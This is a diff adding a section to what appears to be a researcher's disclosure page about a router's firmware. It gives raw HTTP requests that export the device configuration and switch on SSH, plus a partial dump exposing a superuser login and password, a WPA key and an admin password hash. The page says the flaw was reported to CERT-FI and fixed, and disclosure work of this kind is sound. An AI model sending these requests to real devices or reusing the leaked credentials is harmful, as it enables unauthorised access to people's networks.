@@ -16,6 +16,48 @@ The _exploit_ has been fixed in their latest firmware (A50803-Sauna35-24524). So
 
 ...and they did not reply to the question why they store the password in plaintext in the device, it would be more clever to store the password as hash.. oh well.. I will go next thru the material and release all of it. Should take few weekends..
 
+== The data export ==
+*This info has been reported to CERT-FI in 12/2010 with ticket #347299*
+
+Exporting data
+{{{
+GET /cgi-bin/export.cgi?sExportMode=text HTTP/1.1
+Host: 192.168.0.1
+Referer: http://192.168.0.1/setup.htm
+}}}
+
+
+Writing settings
+{{{
+POST /cgi-bin/generic.cgi HTTP/1.1
+Host: 192.168.0.1
+Referer: http://192.168.0.1/setup.htm
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 40
+
+token=GxsWWC&write=Services_SSH_Enable:1
+}}}
+
+
+Begin of a partial dump
+{{{
+WebCam_1_UploadImage_Server='wsftp.wippies.com'
+WebCam_1_UploadImage_Port=2222
+WLANInterface_2_Config_SSID='WippiesVOIP'
+WLANInterface_2_Config_WPADefaultKey='wippiesvoip'
+WLANInterface_2_Config_WPAEncryption='TKIP'
+WebConfigurator_SuLogin='bewan'
+WebConfigurator_SuPassword='8Ve63Cl9hS4g.'
+Services_TR069_ACSUrl='https://acs.wiax.net:8043/acs'
+Services_UnixAdmin_Username='admin'
+Services_UnixAdmin_Password='$1$$yDJWJcZIubC6Kuklfp5n0.'
+Services_UnixAdmin_UserID=600
+Services_UnixAdmin_GroupID=600
+Services_UnixAdmin_Shell='/bin/cli'
+Services_Telnet_Enable=0
+Services_Ssh_Enable=0
+}}}
+
 = OpenWrt runs on this device =
 See page 2+ @ https://forum.openwrt.org/viewtopic.php?id=15934
 
